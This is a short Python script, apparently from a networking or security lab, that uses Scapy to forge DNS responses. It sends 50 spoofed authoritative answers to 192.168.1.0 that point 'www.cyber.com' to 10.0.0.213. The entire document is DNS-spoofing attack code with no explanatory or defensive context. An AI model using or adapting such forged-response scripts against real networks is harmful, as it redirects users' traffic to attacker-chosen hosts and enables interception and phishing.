from scapy.all import *

send(IP(dst="192.168.1.0")/UDP(sport=53)/DNS(qr=1, aa=1, ancount=1, rd=1,qd=DNSQR(qname="cyber.com"), an=DNSRR(rrname='www.cyber.com', rdata="10.0.0.213")), count=50)